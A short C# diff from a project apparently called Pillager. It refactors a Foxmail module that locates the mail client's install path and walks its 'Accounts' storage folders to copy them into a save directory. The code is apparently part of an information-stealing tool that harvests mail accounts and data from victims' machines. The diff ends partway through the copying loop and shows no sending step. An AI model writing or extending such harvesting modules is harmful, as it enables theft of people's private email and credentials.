@@ -5,11 +5,9 @@ using Pillager.Helper;
 
 namespace Pillager.Mails
 {
-    internal class Foxmail
+    internal class Foxmail : ICommand
     {
-        public static string MailName = "Foxmail";
-
-        public static string GetInstallPath()
+        public string GetInstallPath()
         {
             try
             {
@@ -19,13 +17,13 @@ namespace Pillager.Mails
             }
             catch { return ""; }            
         }
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 string installpath = GetInstallPath();
                 if (!Directory.Exists(installpath) || !Directory.Exists(Path.Combine(installpath, "Storage"))) return;
-                string savepath = Path.Combine(path, MailName);
+                string savepath = Path.Combine(path, "Foxmail");
                 Directory.CreateDirectory(savepath);
                 DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(installpath, "Storage"));
                 foreach (var directory in directoryInfo.GetDirectories("Accounts", SearchOption.AllDirectories))
